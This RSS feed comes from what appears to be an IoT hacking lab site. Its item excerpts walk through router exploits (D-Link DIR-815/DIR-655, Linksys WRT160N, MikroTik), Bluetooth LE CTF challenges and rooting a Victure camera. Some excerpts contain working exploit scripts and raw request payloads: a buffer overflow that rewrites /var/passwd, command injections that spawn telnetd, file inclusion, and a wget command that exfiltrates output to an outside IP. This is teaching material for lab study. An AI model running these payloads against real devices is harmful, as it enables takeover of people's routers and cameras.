<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>IoT Hack Labs</title><link>https://iot-hack-labs.github.io/</link><description>Recent content on IoT Hack Labs</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 18 Oct 2021 20:52:11 -0600</lastBuildDate><atom:link href="https://iot-hack-labs.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Auth Buffer Overflow</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/auth-buffer-overflow/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/auth-buffer-overflow/</guid><description>Auth Buffer Overflow import urllib import urllib2 # This exploits the auth_main.cgi with read buffer overflow exploit for v2.02 # prequisite is just to have id and password fields in params url = &amp;#39;http://192.168.0.1/authentication.cgi&amp;#39; junk = &amp;#34;A&amp;#34;*1004+&amp;#34;B&amp;#34;*37+&amp;#34;\x58\xf8\x40\x00&amp;#34; # address of system function in executable junk+=&amp;#34;X&amp;#34;*164+&amp;#39;echo &amp;#34;Admin&amp;#34; &amp;#34;Admin&amp;#34; &amp;#34;0&amp;#34; &amp;gt; /var/passwd\x00&amp;#39;+&amp;#34;AAAA&amp;#34; values = &amp;#34;id=test&amp;amp;password=test&amp;amp;test=&amp;#34;+junk req = urllib2.Request(url, values) response = urllib2.urlopen(req) the_page = response.read()</description></item><item><title>Discovery</title><link>https://iot-hack-labs.github.io/router-lab/mikrotik/01-discovery/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/mikrotik/01-discovery/</guid><description>Discovery This requires the attacker discover that port 8291 is exposed and running the Winbox service. (Not in the default nmap scan port list)
Run nmap against the device.
nmap 172.21.0.4 --top-ports=4000 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 13:20 MDT Nmap scan report for 172.21.0.4 Host is up (0.0047s latency). PORT STATE SERVICE 21/tcp open ftp 8291/tcp open unknown Only ports 8291, 21 are open.
The router version can be found by running nmap with service discovery.</description></item><item><title>Getting Started</title><link>https://iot-hack-labs.github.io/btle-labs/01-getting-started/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-labs/01-getting-started/</guid><description>Devices Because it may be difficult to scan for all Bluetooth devices in such a crowded area, the BLE_CTF_INFINITY MAC addresses for each challenge are provided below.
Challenge 0: 94:B9:7E:DA:08:56 Challenge 1: 08:3A:F2:7D:65:8A Challenge 2: 94:B9:7E:FA:27:72 Challenge 3: 94:B9:7E:F9:21:B6 Tools We can use a few different tools to solve some BLE CTF Infinity challenges.
hciconfig bleah gatttool Hciconfig You can view BLE interfaces on you system by using the hciconfig command.</description></item><item><title>Local File Inclusion</title><link>https://iot-hack-labs.github.io/router-lab/wrt160n/local-file-inclusion/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/wrt160n/local-file-inclusion/</guid><description>Local File Inclusion Make an HTTP POST request to the router like the following:
POST /apply.cgi HTTP/1.1 Host: {TARGET_IP} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Proxy-Connection: keep-alive Authorization: Basic {BASE_64_CREDENTIALS} Content-Type: application/x-www-form-urlencoded Content-Length: 181 Connection: close submit_type=wsc_method2&amp;amp;change_action=gozila_cgi&amp;amp;next_page=../..{FILE} NOTE: Replace {TARGET_IP}, {BASE_64_CREDENTIALS}, {FILE_TO_READ} with the valid IP, credentials, and file to read respectively</description></item><item><title>OS Command Injection</title><link>https://iot-hack-labs.github.io/router-lab/dir-655/os-command-injection/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-655/os-command-injection/</guid><description>OS Command Injection Make an HTTP POST request to the router, replacing &amp;ldquo;{URL_ENCODED_CMD}&amp;rdquo; with the desired command to run on the router like wget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234)
POST /apply_sec.cgi HTTP/1.1 Host: 192.168.232.128 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 131 Connection: close Referer: http://192.168.232.128/login_pic.asp Cookie: uid=1234123 Upgrade-Insecure-Requests: 1 html_response_page=login_pic.asp&amp;amp;action=ping_test&amp;amp;ping_ipaddr=127.0.0.1%0a{URL_ENCODED_CMD}</description></item><item><title>OS Command Injection</title><link>https://iot-hack-labs.github.io/router-lab/wrt160n/os-command-injection/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/wrt160n/os-command-injection/</guid><description>OS Command Injection Make an HTTP POST request to the router like the following:
POST /apply.cgi HTTP/1.1 Host: {TARGET_IP} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Proxy-Connection: keep-alive Authorization: Basic {BASE_64_CREDENTIALS} Content-Type: application/x-www-form-urlencoded Content-Length: 181 Connection: close submit_button=Diagnostics&amp;amp;change_action=gozila_cgi&amp;amp;submit_type=start_ping&amp;amp;action=&amp;amp;commit=0&amp;amp;ping_ip=1.1.1.1&amp;amp;ping_size=|{URL_ENCODED_CMD}|&amp;amp;ping_times=5&amp;amp;traceroute_ip= NOTE: Replace {TARGET_IP}, {BASE_64_CREDENTIALS}, {URL_ENCODED_CMD} with the valid IP, credentials, and url encoded command respectively</description></item><item><title>OS Command Injection I</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-i/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-i/</guid><description>OS Command Injection I import socket import struct # CSRF or any other trickery, but probably only works when connected to network I suppose buf = &amp;#34;POST /HNAP1/ HTTP/1.0\r\nHOST: 99.249.143.124\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX&amp;#34; + &amp;#39;;telnetd -p 9090;\r\n&amp;#39; + &amp;#34;1\r\n\r\n&amp;#34; print &amp;#34;[+] sending buffer size&amp;#34;, len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;192.168.0.1&amp;#34;, 80)) s.send(buf) or
import socket import struct # format junk+ROP1(have right value in A0) + ROP2(add or subtract to create right system address) + ROP3(Jump to right address) buf = &amp;#34;POST /HNAP1/ HTTP/1.</description></item><item><title>OS Command Injection II</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-ii/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-ii/</guid><description>OS Command Injection II import socket import struct # This vulnerability is pretty much in every router that has cgibin and uses SSDP code in that cgibin. This one worked on the device dir-815. Will work only in WLAN buf = &amp;#39;M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:urn:schemas-upnp-org:service:WANIPConnection:1;telnetd -p 9094;ls\r\nMX:2\r\nMAN:&amp;#34;ssdp:discover&amp;#34;\r\n\r\n&amp;#39; print &amp;#34;[+] sending buffer size&amp;#34;, len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.connect((&amp;#34;239.255.255.250&amp;#34;, 1900)) s.send(buf) s.close()</description></item><item><title>References</title><link>https://iot-hack-labs.github.io/router-lab/dir-655/references/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-655/references/</guid><description>References https://www.zdnet.com/article/d-link-routers-contain-remote-code-execution-vulnerability/ https://www.fortinet.com</description></item><item><title>References</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/references/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/references/</guid><description>References https://www.exploit-db.com/exploits/38721 https://www.exploit-db.com/exploits/38715</description></item><item><title>References</title><link>https://iot-hack-labs.github.io/router-lab/x150n/references/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/x150n/references/</guid><description>References https://www.akamai.com/content/dam/site/en/documents/research-paper/upnproxy-blackhat-proxies-via-nat-injections-white-paper.pdf</description></item><item><title>Exploitation</title><link>https://iot-hack-labs.github.io/router-lab/mikrotik/02-exploitation/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/mikrotik/02-exploitation/</guid><description>Exploitation The following versions of Router OS are vulnerable to &amp;ldquo;ByTheWay&amp;rdquo; exploit:
Longterm: 6.30.1 - 6.40.7 Stable: 6.29 - 6.42 Beta: 6.29rc1 - 6.43rc3 The exploit can be found here, from Tenable team: https://github.com/tenable/routeros/tree/master/poc/bythewayThe attacker needs to clone the repo, and build the target. This requires downloading boost libs in Kali and some basic compilation. After that, the exploit should work out of the box, at least it will report the dumped creds.</description></item><item><title>Flag0</title><link>https://iot-hack-labs.github.io/btle-labs/02-flag0/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-labs/02-flag0/</guid><description>Use bettercap to enumerate the characteristics on the device.
$ sudo bettercap &amp;gt; ble.recon on &amp;gt; ble.enum bleah 94:B9:7E:DA:08:56 ⚠️ Try this a few times if it doesn&amp;rsquo;t work and/or removing and plugging in the bluetooth dongle.
For the flag 0, we see that the &amp;lsquo;Device Name&amp;rsquo; kinda looks like a flag.</description></item><item><title>Flag1</title><link>https://iot-hack-labs.github.io/btle-labs/03-flag1/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-labs/03-flag1/</guid><description>Use Bettercap to Enumerate All Characteristics At this point, if we try to use bleah to enumerate the characteristics, we see that bleah shows us some interesting values.
$ sudo bleah -b 08:3A:F2:7D:65:8A -e When enumerating, the value at handle 0x002a returns goodbye 👋. This disconnects the device. We have to use another tool to target reading the other values.
Use Gatttool to Read Characteristics Read the value at 0x002c using gatttool.</description></item><item><title>Flag2</title><link>https://iot-hack-labs.github.io/btle-labs/04-flag2/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-labs/04-flag2/</guid><description>View Gatt Table After switching to challenge 2, use bettercap to enumerate its characteristics again.
$ sudo bettercap &amp;gt; ble.recon on &amp;gt; ble.enum 94:B9:7E:FA:27:72 We see that there is some authentication required, and that we should connect with pin 0000. We can do this with gatttool.
Use Gatttool with Authentication $ gatttool --sec-level=high -b 94:B9:7E:FA:27:72 --char-read -a 0x002c This will prompt you for the pin. Enter 0000 and click OK.</description></item><item><title>Flag3</title><link>https://iot-hack-labs.github.io/btle-labs/05-flag3/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-labs/05-flag3/</guid><description>View Gatt Table Use bettercap to enumerate its characteristics again.
$ sudo bettercap &amp;gt; ble.recon on &amp;gt; ble.enum 94:B9:7E:F9:21:B6 We can see that it is looking for a device with the MAC address 11:22:33:44:55:66 to connect to it.
View the Interface MAC Address Use hciconfig to view the MAC address of the interface.
Spooftooph We can spoof our mac address with the tool spooftooph. (Make sure to use sudo)
$ sudo spooftooph -i hci0 -a 11:22:33:44:55:66 Once we have done this, we need to reset the interface for the changes to take.</description></item><item><title>Finishing up</title><link>https://iot-hack-labs.github.io/btle-labs/09-outro/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-labs/09-outro/</guid><description>References https://github.com/hackgnar/ble_ctf_infinity Chapter 11 of Practical IoT Hackingfrom No Starch Press.</description></item><item><title>Ultraloq-UL3</title><link>https://iot-hack-labs.github.io/btle-labs/99-ultraloq-ul3/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-labs/99-ultraloq-ul3/</guid><description>Ultraloq UL3 Find the firmware version that is being broadcasted by the Ultraloq UL3 Bluetooth enabled lock.
This can be done using some different tools.
Bettercap Because there are so many BLE devices in crowded areas, we will provide you the MAC address of the Ultraloq UL3:
78:DB:2F:DA:BA:3B
You can also use a tool like bettercap to find this.
$ sudo bettercap
&amp;gt; ble.recon on
You will have to turn off recon shortly after starting it because there are so many devices.</description></item><item><title>Micro SD</title><link>https://iot-hack-labs.github.io/victure-pc420/01-micro-sd/</link><pubDate>Mon, 18 Oct 2021 20:46:32 -0600</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/01-micro-sd/</guid><description>Micro SD The micro SD must be FAT32 formatted. The following steps can be skipped if your micro SD is already FAT32 formatted.
Partitioning When the micro SD card is plugged in, run the following to determine the micro SD&amp;rsquo;s block device on the computer
kali@kali:~$ sudo fdisk -l Disk /dev/sda: 80 GiB, 85899345920 bytes, 167772160 sectors Disk model: VMware Virtual S Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0x0852c5cd Device Boot Start End Sectors Size Id Type /dev/sda1 * 2048 165771263 165769216 79G 83 Linux /dev/sda2 165773310 167770111 1996802 975M 5 Extended /dev/sda5 165773312 167770111 1996800 975M 82 Linux swap / Solaris Disk /dev/sdb: 3.</description></item><item><title>UART to U-Boot</title><link>https://iot-hack-labs.github.io/victure-pc420/02-uart-to-uboot/</link><pubDate>Mon, 18 Oct 2021 20:47:46 -0600</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/02-uart-to-uboot/</guid><description>UART to U-Boot We will now connect to the Victure camera via the USB to TTL adapter.
Connect the female ends of the jumper cables to the TX, RX, and GND pins on the USB to TTL adapter shown above. Once done, connect the adapter to the computer
screen can be used to connect to serial consoles. To connect to the adapter, run the following
kali@kali:~$ screen /dev/ttyUSB0 115200 Where,</description></item><item><title>U-Boot to Root</title><link>https://iot-hack-labs.github.io/victure-pc420/03-uboot-to-root/</link><pubDate>Mon, 18 Oct 2021 20:48:21 -0600</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/03-uboot-to-root/</guid><description>U-Boot to Root The current shell is actually a U-Boot a limited shell. U-Boot is an open-source, primary boot loader. This shell has commands related to the booting process.
anyka$ help ? - alias for &amp;#39;help&amp;#39; base - print or set address offset bootm - boot application image from memory bootp - boot image via network using BOOTP/TFTP protocol chpart - change active partition cmp - memory compare cp - memory copy crc32 - checksum calculation downcheck_patition_update- load usr.</description></item><item><title>Configure Remote Connection</title><link>https://iot-hack-labs.github.io/victure-pc420/04-configure-remote-connection/</link><pubDate>Mon, 18 Oct 2021 20:48:21 -0601</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/04-configure-remote-connection/</guid><description>Configure Remote Connection We have successfully been dropped into a root shell on the camera, but this required physical access. We are next going to update the camera&amp;rsquo;s firmware to run telnetd upon booting up, allowing us to connect to it remotely.
Dump Firmware The first step in enabling remote connections is to dump the camera&amp;rsquo;s firmware.
You may notice that, though we have shell, basic commands like whoami seem to give errors</description></item><item><title>Test Remote Connection</title><link>https://iot-hack-labs.github.io/victure-pc420/05-test-remote-connection/</link><pubDate>Mon, 18 Oct 2021 20:52:11 -0600</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/05-test-remote-connection/</guid><description>Test Remote Connection Now that the camera is connected to the WiFi, we should be able to disconnect our USB to TTL adapter and remotely connect to it.
kali@kali:~$ telnet 192.168.4.46 Trying 192.168.4.46... Connected to 192.168.4.46. Escape character is &amp;#39;^]&amp;#39;. anyka login: root Password: welcome to file system [root@anyka ~]$ uname -a Linux anyka 3.4.35 #9 Thu Feb 25 11:45:35 UTC 2021 armv5tejl GNU/Linux</description></item></channel></rss>